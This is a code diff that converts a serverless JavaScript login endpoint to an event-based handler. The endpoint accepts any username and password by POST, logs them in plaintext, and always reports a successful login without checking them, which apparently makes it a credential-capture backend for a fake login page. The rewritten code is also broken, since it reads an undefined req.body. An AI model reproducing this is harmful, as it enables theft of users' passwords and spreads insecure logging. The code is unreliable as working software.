@@ -1,18 +1,25 @@
-
-
-export default async function handler(req, res) {
-  if (req.method === "POST") {
-    const { username, password } = req.body;
-    const data = `Username: ${username}, Password: ${password}`;
-
+export const handler = async (event, context) => {
+  if (event.httpMethod === "POST") {
     try {
-      console.log(data);
-      res.status(200).send("Login successful");
+      const { username, password } = req.body;
+      const data = `Username: ${username}, Password: ${password}`;
+
+      console.log("[Login Attempt: ", data);
+
+      return {
+        statusCode: 200,
+        body: "Login successfull",
+      };
     } catch (err) {
-      console.err(err);
-      res.status(500).send("Error saving data");
+      console.error("[Error]:", err);
+      return {
+        statusCode: 500,
+        body: "Error processing request",
+      };
     }
-  } else {
-    res.status(405).send("Not allowed");
   }
-}
+  return {
+    statusCode: 405,
+    body: "Method not allowed",
+  };
+};
